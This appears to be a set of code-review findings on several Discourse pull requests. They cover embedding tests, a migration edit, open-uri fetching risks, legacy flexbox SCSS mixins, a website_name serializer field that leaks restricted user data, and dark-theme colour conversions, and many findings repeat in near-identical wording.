body: This example does not stub `SiteSetting.embeddable_host`, so the `ensure_embeddable` before_filter raises `Discourse::InvalidAccess('embeddable host not set')` before `params.require(:embed_url)` is ever reached. The test therefore asserts nothing about the missing-parameter behaviour (and would keep passing if `params.require` were removed). It should stub `embeddable_host` and a matching referer, and assert the actual expected status. There is also no example covering a referer whose host differs from `embeddable_host` — the main security check of this controller.

title: PollFeed guard examples are tautological and poll_feed itself is untested
body: `feed_polling_enabled?` defaults to false, so the "requires feed_polling_url" and "requires embed_by_username" examples would pass even if those two conditions were removed from `execute`; they need `feed_polling_enabled?` stubbed true and only the setting under test blanked. More importantly, `poll_feed` — the part that fetches the feed, picks `i.link`/`i.id`, unescapes content and calls `TopicEmbed.import` — has no coverage at all, which is why the nil-`content` crash and the unsanitized-HTML path are unguarded.

title: Already-shipped migration edited to add `force: true`
body: Adding `force: true` to `create_table :top_topics` changes an existing, already-released migration so that it silently drops the `top_topics` table if it exists. Anyone re-running this migration (e.g. after a schema_migrations reset or a partial rollback) now loses the table and its data instead of getting a clear "table already exists" error. This change is also unrelated to the embedding feature in this PR.

title: `X-Frame-Options: ALLOWALL` is not a valid header value
body: `ALLOWALL` is not a defined X-Frame-Options directive. Browser handling of unknown values varies: some ignore the header entirely (which is the intent, but only by accident), others treat an unparseable value conservatively and refuse to frame the page, which would break embedding. To allow framing, the header should simply not be emitted (delete it) rather than set to an invalid token.

title: Kernel#open used for remote fetching (no timeout/size limit, pipe/file handling)
body: `open(SiteSetting.feed_polling_url)` and `open(url).read` in `TopicEmbed.import_remote` use `Kernel#open` from open-uri, which interprets a leading `|` as a shell command and happily opens local file paths, and imposes no read timeout or response size limit. The whole response is read into memory inside a Sidekiq job. Use `URI.parse` plus an explicit HTTP client (or at minimum validate the scheme is http/https and cap the read) so a mistyped/hostile setting or feed link cannot execute a command, read local files, or hang/OOM the worker.

title: Only the Rails 4 lockfile was updated for the new gems
body: `ruby-readability` and `simple-rss` were added to the Gemfile and recorded in `Gemfile_rails4.lock`, but the Rails 3 lockfile (used when booting with `RAILS3=1`, see the dual-boot logic at the top of this Gemfile) was not regenerated. Booting/deploying in Rails 3 mode with a frozen or `--deployment` bundle will fail because the lockfile no longer matches the Gemfile.

title: order() mixin maps 0-based `order` onto 1-based legacy ordinal-group
body: The new `order($val)` mixin emits the same number for `-webkit-box-ordinal-group` / `-moz-box-ordinal-group` as for the standard `order` property. These are not equivalent: in the 2009 box spec `box-ordinal-group` is 1-based (initial value 1) while `order` is 0-based (initial value 0). Consequences: (a) `@include order(0)` emits `-webkit-box-ordinal-group: 0`, which is invalid and is dropped, and (b) any element given `order(1)` intending it to be placed *after* non-ordered siblings will instead be grouped with them in legacy-box engines, because unordered siblings default to ordinal-group 1. The legacy lines should use `$val + 1` (and the mixin should guard against `$val < 0`). This matters for the new usages `@include order(2)` on `.extra-info-wrapper` and `@include order(3)` on `.d-header .panel`, which only accidentally line up today because `.title` has no explicit order.

title: align-items() forwards modern keywords to legacy properties that do not accept them
body: `align-items($alignment)` passes `$alignment` verbatim to `-webkit-box-align` and `-ms-flex-align`. Those legacy properties only accept `start | end | center | baseline | stretch`, so the very common modern values `flex-start` and `flex-end` will produce invalid declarations that are silently dropped, leaving legacy engines (which are precisely the ones receiving `display: -webkit-box` / `-ms-flexbox` from the new `flexbox()` mixin) with the default `stretch` alignment. The current call sites only use `center` and `baseline`, so the bug is latent, but as a shared mixin it will break the first time someone writes `@include align-items(flex-start)`. The mixin should translate `flex-start`/`flex-end` to `start`/`end` for the legacy properties.

title: align-items() has no -moz-box-align although flexbox() emits display: -moz-box
body: `flexbox()` and `inline-flex()` emit `display: -moz-box` / `-moz-inline-box` for old Gecko, and `order()` emits `-moz-box-ordinal-group`, but `align-items()` omits `-moz-box-align`. Old Firefox versions therefore get legacy box layout with no cross-axis alignment at all (default stretch), which is exactly the case the prefix fallback was added for: e.g. `.d-header .contents` and `.small-action` will render with stretched, non-centered children instead of the intended vertical centering. Either add `-moz-box-align` or drop the `-moz-box` display fallbacks so the prefix coverage is internally consistent.

title: Making .small-action a flex container breaks right alignment of its button
body: `.small-action` is now `display: flex`, which makes `float` on its direct children a no-op. The `button { float: right; }` rule at the end of the block (and `.topic-avatar { float: left; }`) therefore no longer have any effect: the small-action button will be laid out immediately after `.small-action-desc` instead of being pushed to the right edge of the post, because `.small-action-desc` has no `flex: 1`/`flex-grow` and the button has no `margin-left: auto`. The existing `clear: both` on the flex container is likewise dead. Add `margin-left: auto` to the button (or `flex: 1` to `.small-action-desc`) and remove the now-meaningless float/clear declarations.

title: Header .panel right alignment relies on auto margins, which the legacy box fallback does not support
body: `.panel` previously used `float: right`; it now relies on `margin-left: auto` inside the flex `.contents`. Auto margins do not distribute free space in the 2009 flexbox (`display: -webkit-box` / `-moz-box`) that the new `flexbox()` mixin emits as a fallback, and there is no `-webkit-box-pack: end` equivalent. In engines that pick the legacy box display (old WebKit/Gecko builds) the panel with the search/user/hamburger icons will sit flush against the title instead of at the right edge of the header, i.e. a visible header regression for those browsers. Either add the legacy packing properties or drop the legacy `display` fallbacks so those browsers keep the float-based layout.

title: `float: right` on .small-action button is inert now that .small-action is a flex container
body: `.small-action` now gets `@include flexbox()` (display:flex), which makes float declarations on its direct children no-ops. The `button` child still relies on `float: right` to be pushed to the right edge of the small-action row (e.g. the undo/delete control). With flex layout the button becomes a normal flex item sized to its content and will sit immediately after `.small-action-desc` instead of at the right edge of the row. To keep the previous layout the button needs `margin-left: auto` (or the description needs `flex: 1`). The same applies to `float: left` on `.topic-avatar` (line 270), which is now dead code.

title: Removing vertical padding from .small-action-desc can let the floated avatar overflow
body: `.small-action-desc` changed from `padding: 0.5em 0 0.5em 4em; margin-top: 5px` to `padding: 0 1.5%`, but `.small-action-desc .avatar` (line 298) is still floated. A float does not contribute to the height of its block container, so with zero vertical padding the flex item's height is only the text line height; if the avatar is taller than one line of the 0.9em text it will overflow the flex item and overlap neighbouring content. Previously the 0.5em padding plus 5px margin absorbed the difference. Consider clearing the float or using flex/inline-block for the avatar instead.

title: .panel loses right alignment on the legacy box model the flexbox mixin targets
body: `.panel` replaced `float: right` with `margin-left: auto` + `order(3)`. `margin-left: auto` only pushes a flex item to the end in the modern flexbox spec; the `flexbox()` mixin deliberately also emits `display: -webkit-box` and `display: -moz-box` for old WebKit/Gecko, where auto margins are not honoured in the box model. In those browsers the header panel (notification/search/user icons) will now render left-aligned right after the title instead of at the right edge. Either drop the legacy `display` fallbacks or add `-webkit-box-pack: end` / `-ms-flex-pack: end` on `.contents`.

title: align-items mixin passes modern values straight to legacy properties and omits -moz-box-align
body: `align-items($alignment)` forwards the value verbatim to `-webkit-box-align` and `-ms-flex-align`, but those legacy properties only accept `start | center | end | baseline | stretch`. Any future call with the spec values `flex-start`, `flex-end`, `space-between`, etc. will emit invalid declarations that old browsers drop silently, so the legacy prefixes give a false sense of coverage (and the invalid value is easy to miss because the standard `align-items` still works). The mixin also never emits `-moz-box-align`, even though `flexbox()` emits `display: -moz-box`, so legacy Gecko gets box layout with no alignment. Finally, `-ms-align-items` (line 121) is not a real property in any browser and is dead output. Consider mapping values (e.g. `flex-start` -> `start`) or dropping the legacy prefixes entirely.

title: order mixin maps directly onto 1-based box-ordinal-group
body: `order($val)` emits `-webkit-box-ordinal-group`/`-moz-box-ordinal-group` with the same number as `order`. The legacy ordinal-group property is 1-based (minimum value 1, default 1) while `order` is 0-based with default 0, so any call with `order(0)` or a negative value (both legal for `order`) produces an invalid legacy declaration, and relative ordering between items that set `order` and items that do not can differ between the legacy and modern code paths. If the legacy prefixes are kept, the value should be offset/validated; otherwise they should be dropped.

title: inline-flex mixin forces legacy box layout where a safe inline-block fallback existed
body: `.badge-wrapper.bullet` previously declared only `display: inline-flex`, so browsers without flexbox support simply kept `display: inline-block` from the `.badge-wrapper` rule and rendered correctly. The new `inline-flex()` mixin additionally emits `display: -webkit-inline-box` / `-moz-inline-box` / `-ms-inline-flexbox`, which those same old browsers *do* understand, switching the bullet badges to the legacy box model with different sizing/shrinking rules (relevant here because `span.badge-category` relies on `max-width`, `overflow: hidden` and `text-overflow: ellipsis`). This is a rendering change for old browsers that was previously handled gracefully; verify it or drop the legacy display fallbacks.

title: `float: right` on `.small-action button` stops working now that `.small-action` is a flex container
body: `.small-action` was converted to a flex container (`@include flexbox()` at the top of the block). Floats are ignored on flex items, so the `button { float: right; }` declaration inside `.small-action` no longer has any effect: the action button (e.g. the undo/delete control on small post actions) will now be laid out immediately after `.small-action-desc` instead of being pushed to the right edge of the row. The same applies to `.topic-avatar { float: left; }` at line 270, which is now dead. To keep the previous visual result the button should use `margin-left: auto` (and `.small-action-desc` likely needs `flex: 1`).

title: align-items mixin emits invalid legacy values for flex-start/flex-end/stretch
body: The `align-items($alignment)` mixin passes the modern keyword straight through to the 2009 (`-webkit-box-align`) and 2012 (`-ms-flex-align`) properties, but those specs use `start`/`end`/`stretch` rather than `flex-start`/`flex-end`. Any future call such as `@include align-items(flex-start)` will silently produce `-webkit-box-align: flex-start; -ms-flex-align: flex-start;`, which browsers discard, so the legacy fallback the mixin exists to provide will not work while giving the appearance that it does. (Also note `-ms-align-items` on line 121 is not a property implemented by any browser and is pure dead output.) Either map the values inside the mixin or drop the legacy properties.

title: order mixin has an off-by-one between `order` and `box-ordinal-group`
body: `order` is 0-based with an initial value of 0, while `-webkit-box-ordinal-group`/`-moz-box-ordinal-group` are 1-based with an initial value of 1 and reject 0. The mixin forwards `$val` unchanged, so `@include order(0)` emits an invalid `box-ordinal-group: 0`, and `@include order(1)` gives an element the same legacy ordinal group as unordered siblings instead of placing it first. The current call sites (order 2 and 3) happen to still sort correctly, but any use of 0 or 1 will reorder differently in the legacy box model than in modern flexbox. The legacy value should be `$val + 1` (or the legacy properties dropped).

title: Header panel right-alignment relies on auto margins that the legacy box model in the same mixin does not support
body: `.d-header .contents` now gets `display: -webkit-box; display: -moz-box; ...` from `flexbox()`, and `.panel` lost `float: right` in favour of `margin-left: auto` + `order: 3`. In exactly the browsers those legacy `-webkit-box`/`-moz-box` prefixes target, auto margins do not push a box to the end of the main axis (that requires `-webkit-box-pack: end`), so with the float removed the header panel (icons/login buttons) will render left-aligned next to the title instead of on the right. Either add the legacy `box-pack` fallback or remove the 2009 `display` values so those browsers fall back to block layout plus the float.

title: `include_website_name` is missing the trailing `?` so the guard never runs
body: ActiveModel::Serializers looks for a predicate named `include_<attribute>?`. The method is defined as `include_website_name` (no question mark), so it is dead code and `website_name` is unconditionally serialized. Consequences: (1) the key `website_name` is emitted with a `nil` value for every user that has no website, bloating every user payload and breaking any consumer that checks for key presence; (2) the intended `website.present?` gating is silently not applied. Rename to `include_website_name?`.

title: `website_name` is not listed in `untrusted_attributes`, leaking a TL0 user's website to anonymous visitors
body: `website` is declared in `untrusted_attributes` so that, when `scope.restrict_user_fields?(object)` is true (TL0 user viewed anonymously), the URL is not exposed — this is an anti-spam/privacy measure. The new `website_name` attribute returns the website host (and, for same-domain sites, the full path) but is not added to `untrusted_attributes`, and its own include guard (see `include_website_name`) only checks `website.present?`. The restricted URL is therefore disclosed through `website_name`, defeating the existing restriction. Add `:website_name` to the `untrusted_attributes` list (or make the include predicate also honour `scope.restrict_user_fields?`).

title: `"." << website_host` mutates a string literal
body: `discourse_host.ends_with?("." << website_host)` uses destructive append on the literal `"."`. It happens to work today because each evaluation allocates a fresh literal, but it will raise `FrozenError` the moment this file gets `# frozen_string_literal: true` (or the interpreter is run with frozen literals enabled), and it is needlessly allocating/mutating. Use `".#{website_host}"` or `"." + website_host`.

title: No spec covers `website_name` visibility, so the untrusted/include regressions are undetected
body: The TL0-seen-as-anonymous context enumerates `untrusted_attributes` but does not include `website_name`, so the fact that the new attribute leaks a restricted website is not caught. There is likewise no spec for a user with a blank website (which currently serialises `website_name: nil` because the include predicate is misnamed `include_website_name`), nor for the sibling-subdomain branch (`www.example.com` website with `forum.example.com` instance). Add specs for these three cases so the guards are actually exercised.

title: Domain-matching heuristic mis-handles `www.` hosts and false-positives on shared public suffixes
body: The branch logic only compares hosts when the label counts are equal and > 2. Consequences: (a) website `http://www.example.com/user` on an instance hosted at `example.com` falls through to the `else` branch, where `"example.com".ends_with?(".www.example.com")` is false, so the path is dropped even though it is the same site — exactly the case this PR is meant to handle; (b) hosts sharing only a public suffix, e.g. website `foo.blogspot.com` with instance `bar.blogspot.com`, compare equal on the last two labels and get the full path rendered even though they are unrelated sites. Consider normalising a leading `www.` and comparing registrable domains instead of raw label suffixes.

title: website_name is not listed in untrusted_attributes, leaking TL0 users' website to anonymous visitors
body: `:website` is included in `untrusted_attributes` (line 105-111) so that a trust-level-0 user's website is hidden from anonymous viewers (anti-spam/SEO measure). The new `:website_name` attribute is added to the plain `attributes` list only, so it is always serialized and now exposes the host (and, for same-domain sites, the full path) of a TL0 user's website to anonymous requests. The front-end template renders `model.website_name` unconditionally, so the previously suppressed information becomes visible again. `:website_name` should be added to `untrusted_attributes` (and the TL0 spec list updated).

title: include_website_name is missing the trailing '?' so the inclusion guard is dead code
body: ActiveModel::Serializers looks for a predicate named `include_<attribute>?`. The method defined here is `include_website_name` (no question mark), so it is never called and `website_name` is always emitted — including as `null` for every user without a website. Rename it to `include_website_name?` (and note that its body should also honour `scope.restrict_user_fields?`, see the untrusted-attributes issue).

title: `"." << website_host` mutates a string literal
body: `discourse_host.ends_with?("." << website_host)` uses destructive append on a string literal. It works today only because literals are unfrozen; under `# frozen_string_literal: true` (or if the file is ever frozen-string-literal enabled) this raises `FrozenError` at runtime for every profile serialization. Use `".#{website_host}"` or `"." + website_host`.

title: Sibling-subdomain comparison yields false positives on shared public suffixes
body: The branch that strips the first label (`www.example.com` vs `forum.example.com`) compares only the remaining labels, so unrelated sites that merely share a public suffix of the same label count are treated as the same domain — e.g. instance `forum.github.io` and user website `someone.github.io`, or any pair under a 3-label suffix. The result is that the full URL path of an unrelated third-party site is rendered as the link text. Consider restricting this to a registrable-domain comparison (e.g. PublicSuffix) or at least matching only when one host is a suffix of the other.

title: Only URI path is appended; query/fragment are dropped and host matching is case sensitive
body: `website_name` builds the display text from `host + path`, so for `http://example.com/u?tab=1#x` on a same-domain instance it renders `example.com/u`, silently hiding the part of the URL the feature is meant to disclose. Additionally `URI#host` preserves the case as typed, so `http://Example.com` never equals `Discourse.current_hostname` (`example.com`) and falls into the generic branch. Downcase the host before comparing and include query/fragment (or use `URI#request_uri`) if the goal is to show the complete URL.

title: TL0/anonymous spec does not assert website_name is withheld
body: The `untrusted_attributes` list in the "TL0 user seen as anonymous" context was not updated with `website_name`, so the new attribute's exposure to anonymous viewers is untested and the regression described above passes CI. Add `website_name` to that list (after fixing the serializer) so the privacy guard is covered.

title: Missing cases for sibling-subdomain branch and blank/invalid website
body: The new specs cover only equal hosts, unrelated hosts, and website-domain-is-parent-of-instance. There is no coverage for the sibling-subdomain branch the code explicitly implements (e.g. instance `forum.example.com`, website `http://www.example.com/user`), for the reverse case (instance `example.com`, website `www.example.com`), or for a blank/unparseable website (which must return nil without raising and ideally omit the key). These are the branches most likely to break.

title: website_name bypasses the untrusted_attributes restriction for TL0 users
body: `website` is declared in `untrusted_attributes` (line 109), so for a trust-level-0 user viewed by an anonymous visitor the serializer omits it (`scope.restrict_user_fields?`). The new `website_name` attribute is added to the plain `attributes` list only, so it is always emitted and exposes the host (and, for same-domain URLs, the full path) of the very field that was deliberately hidden. This defeats the anti-spam/privacy protection: a TL0 spammer's domain is still visible to anonymous users through `website_name`. `website_name` should be added to `untrusted_attributes` (or its `include_...?` should delegate to the same check).

title: include_website_name is missing the trailing question mark so it is never called
body: ActiveModel::Serializers looks up conditional inclusion methods named `include_<attribute>?`. The method defined here is `include_website_name` (no `?`), so it is dead code and `website_name` is serialized unconditionally, emitting `"website_name": null` for every user without a website and adding noise to every user payload. Rename to `include_website_name?`.

title: String mutation with `<<` on a literal in the suffix check
body: `discourse_host.ends_with?("." << website_host)` mutates the receiver string literal in place instead of concatenating with `+`. It happens to work today because the literal is recreated on each call, but it will raise `FrozenError` the moment this file gets `# frozen_string_literal: true` (which Discourse added file-by-file), and it is needlessly destructive. Use `"." + website_host` or string interpolation.

title: Host comparison is case-sensitive, so mixed-case URLs are treated as a different domain
body: `URI#host` preserves the case the user typed, while `Discourse.current_hostname` is lower-case. For a profile website such as `http://Example.com/user` on an `example.com` instance, `website_host == discourse_host` is false and all the subsequent suffix comparisons fail too, so the full path is not shown and the feature silently does nothing. Downcase `website_host` (and the host used for the suffix/segment comparisons) before comparing.

title: Repeated URI parsing and only one of the branches handles sub/parent domains
body: `URI(website.to_s)` is parsed up to three times per call (once for the host, again in each branch for the path) even though a single parsed object would do; the `rescue nil` only guards the first parse, so an input that parses inconsistently would raise from the later unguarded `URI(...)` calls. Additionally the sibling-domain branch only strips a single label (`www.example.com` vs `forum.example.com`), so a website like `blog.example.com` on an `example.com` instance is not recognised as the same domain. Parse once into a local variable and compare registrable domains consistently.

title: TL0/anonymous spec does not assert that website_name is withheld
body: The `untrusted_attributes` list in this spec (used by the "doesn't serialize untrusted attributes" example) still contains only the old fields, so the new `website_name` attribute is not covered. As a result the spec passes even though `website_name` is serialized for a TL0 user seen by an anonymous visitor, leaking the restricted website value. Add `website_name` to the list once the serializer is fixed.

title: The sibling-subdomain branch of website_name is untested
body: The three new examples cover only the exact-match case and the "website host is a suffix of the instance host" case (both of which go through the first `if` and the final `else`). The most intricate branch, the equal-label-count comparison at user_serializer.rb:144-146 (e.g. website `www.example.com` on instance `forum.example.com`, and the negative case `www.example.com` vs `forum.other.com`), has no coverage, as does the blank/invalid-website path that returns nil. These are the branches most likely to regress.

title: Light-theme lightness changed from 30% to 70% for embedded post author link
body: In `.embedded-posts .topic-meta-data h5 a` the value was `scale-color($primary, $lightness: 30%)` and is now `dark-light-choose(scale-color($primary, $lightness: 70%), scale-color($secondary, $lightness: 30%))`. Every other conversion in this PR keeps the original lightness for the light-theme (first) argument and uses the complement (100% - X) for the dark-theme argument, i.e. this should be `(30%, 70%)`. As written, the author name in "in reply to" expansions becomes much lighter (lower contrast) on light themes — an unintended visual regression unrelated to the dark-theme fix.

title: Arguments appear swapped for .custom-message-length, darkening light themes
body: `.custom-message-length` was `scale-color($primary, $lightness: 70%)` and became `dark-light-choose(scale-color($primary, $lightness: 30%), scale-color($secondary, $lightness: 70%))`. The light-theme branch dropped from 70% to 30%, making this hint text substantially darker on light themes, and it diverges from the desktop rule (`desktop/modal.scss` line 94) which uses `(70%, 30%)`. The two arguments look swapped; it should be `dark-light-choose(scale-color($primary, $lightness: 70%), scale-color($secondary, $lightness: 30%))`.

title: topic-map h3 light-theme lightness changed 20% -> 50%
body: In `.topic-map h3` the original value `scale-color($primary, $lightness: 20%)` became `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))`. The light-theme value is now 50% instead of 20%, so the topic map heading loses contrast on light themes, and it no longer matches the desktop rule (`desktop/topic-post.scss` line 321) which uses `(20%, 80%)`. Expected conversion: `dark-light-choose(scale-color($primary, $lightness: 20%), scale-color($secondary, $lightness: 80%))`.

title: group-member-info .name light-theme lightness changed 30% -> 50%
body: `.user-stream .group-member-info .name` was `scale-color($primary, $lightness: 30%)` and is now `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))`. The light-theme value changed from 30% to 50%, lightening the group member name on existing light themes. If only the dark-theme behaviour was meant to change, this should be `(30%, 70%)`.

title: Mobile group-member-info .name light-theme lightness changed 30% -> 50%
body: Same issue as the desktop stylesheet: `.user-stream .group-member-info .name` was `scale-color($primary, $lightness: 30%)` and became `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))`, altering the light-theme rendering (lighter, lower contrast) in addition to the intended dark-theme fix. Expected `(30%, 70%)` to preserve existing light-theme output.

title: #file-uploading still uses scale-color($secondary) for both themes
body: `#file-uploading { color: scale-color($secondary, $lightness: 50%); }` was left unconverted while the adjacent `#draft-status` on line 36 was fixed. On a light theme `$secondary` is white, so scaling it 50% toward white yields a near-white color drawn on `#reply-control`'s light-gray background (`dark-light-diff($primary, $secondary, 90%, -60%)`), making the upload status text effectively unreadable. It should use `dark-light-choose(...)` with `$primary`-derived color for light themes, like the other rules in this PR.

title: Missed conversion: category badge-notification color still scale-color($primary)
body: `.topic-list.categories .category .badge-notification` still uses `color: scale-color($primary, $lightness: 50%)` in a file that this PR otherwise converted. On dark themes this lightens `$primary` (already light) toward white, producing a near-white count badge instead of the intended muted gray, which is exactly the problem the PR fixes elsewhere. It should be `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))` for consistency.

title: Comment documenting topic-list default color is now stale
body: The comment `// is scale-color($primary, $lightness: 50%)` above the coldmap rules describes the default topic-list cell color, but those defaults were changed in this PR (`common/base/_topic-list.scss` now uses `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))`). The comment should be updated so future readers don't copy the obsolete single-argument form.

title: Embedded-post author link color changed from 30% to 70% lightness in light themes
body: In `.embedded-posts .topic-meta-data h5 a` the color was `scale-color($primary, $lightness: 30%)` and is now `dark-light-choose(scale-color($primary, $lightness: 70%), scale-color($secondary, $lightness: 30%))`. Every other conversion in this PR keeps the original value as the first (light-theme) argument and uses the complement (100 - X) as the dark-theme argument. Here the light-theme argument was changed from 30% to 70%, so on default/light color schemes the bolded author username link becomes a very pale grey on a light background (much lower contrast than before). The intent was presumably `dark-light-choose(scale-color($primary, $lightness: 30%), scale-color($secondary, $lightness: 70%))`.

title: Group member `.name` light-theme color changed from 30% to 50% lightness
body: `.user-stream .group-member-info .name` previously used `scale-color($primary, $lightness: 30%)`; it is now `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))`. The first argument of `dark-light-choose` is the light-theme value, so this silently lightens the member name in light themes and makes it identical to the adjacent `.title` (which was intentionally lighter at 50%), losing the visual hierarchy between name and title. The light value should stay at 30% with a 70% dark complement.

title: Mobile group member `.name` light-theme color changed from 30% to 50% lightness
body: `.user-stream .group-member-info .name` was `scale-color($primary, $lightness: 30%)` and is now `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))`. Since the first argument is the light-theme value, the member name becomes lighter than before on default themes and is now indistinguishable from the sibling `.title` (intentionally 50%). Keep 30% for light and use 70% for the dark branch.

title: `.custom-message-length` light-theme color flipped from 70% to 30% lightness
body: The original rule was `color: scale-color($primary, $lightness: 70%)`; the new rule is `dark-light-choose(scale-color($primary, $lightness: 30%), scale-color($secondary, $lightness: 70%))`. The arguments look swapped relative to the rest of the PR (and relative to `desktop/modal.scss`, which uses 70%/30% for the same selector): light themes now get a much darker hint text than before, and the two platforms no longer match. Should be `dark-light-choose(scale-color($primary, $lightness: 70%), scale-color($secondary, $lightness: 30%))`.

title: Mobile topic-map `h3` light-theme color changed from 20% to 50% lightness
body: `.topic-map h3` was `scale-color($primary, $lightness: 20%)` and is now `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))`. The light-theme argument was changed from 20% to 50%, so the topic-map heading becomes noticeably lighter/lower contrast on default themes, and it no longer matches the desktop rule which correctly uses `dark-light-choose(... 20%, ... 80%)`. Light value should remain 20% with an 80% dark complement.

title: Missed conversion: category badge-notification still uses raw scale-color($primary)
body: `.topic-list.categories .category .badge-notification` still uses `color: scale-color($primary, $lightness: 50%)` while every other `$primary` lightness usage in this file was converted to `dark-light-choose(...)`. On dark color schemes `$primary` is light, so lightening it by 50% yields an almost-white badge count instead of the intended muted tone, leaving this element inconsistent with the rest of the dark-theme work in this PR.

title: `#file-uploading` color uses $secondary for both themes and is invisible on light themes
body: Directly above the converted `#draft-status` rule, `#file-uploading { color: scale-color($secondary, $lightness: 50%); }` is left untouched. Because `$secondary` is the background color, in light themes this is a near-white text color on a light background, making the "uploading" status effectively invisible. Since this PR is specifically about making these muted colors theme-aware, this should become `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))` like the neighbouring rule.

title: Light-theme color silently changed from 30% to 70% lightness for embedded post author link
body: For `.embedded-posts .topic-meta-data h5 a` the old rule was `color: scale-color($primary, $lightness: 30%)`. The new rule is `dark-light-choose(scale-color($primary, $lightness: 70%), scale-color($secondary, $lightness: 30%))`, i.e. the light-theme branch was changed from 30% to 70% lightness. Every other conversion in this PR keeps the original lightness in the first (light-theme) argument and uses `100 - X` for the `$secondary` argument. The result is that on light themes the author name in an expanded in-reply-to/reply block is rendered ~70% lightened primary (very close to the background), a noticeable contrast/accessibility regression unrelated to the stated purpose of the PR. The first argument should stay `scale-color($primary, $lightness: 30%)` with `scale-color($secondary, $lightness: 70%)` as the dark branch.

title: Group member name light-theme lightness changed from 30% to 50%
body: `.user-stream .group-member-info .name` previously used `scale-color($primary, $lightness: 30%)`; it is now `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))`. The light-theme value was changed from 30% to 50%, so the member name becomes lighter than before on light themes and is now indistinguishable from the sibling `.title` (which was intentionally dimmer at 50%). Per the PR's own convention the pair should be `30%` / `70%`.

title: Mobile group member name light-theme lightness changed from 30% to 50%
body: `.user-stream .group-member-info .name` previously used `scale-color($primary, $lightness: 30%)` and is now `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))`. This alters light-theme rendering (name becomes lighter and identical to the deliberately dimmer `.title` below it) instead of only adding dark-theme support. Should be `30%` / `70%` to preserve the existing light-theme appearance.

title: Topic-map h3 light-theme lightness changed from 20% to 50%
body: `.topic-map h3` previously used `scale-color($primary, $lightness: 20%)` and now resolves to `scale-color($primary, $lightness: 50%)` on light themes. The heading text in the mobile topic map therefore becomes considerably lighter than before and matches the subordinate `h4` (also 50%), removing the visual hierarchy.
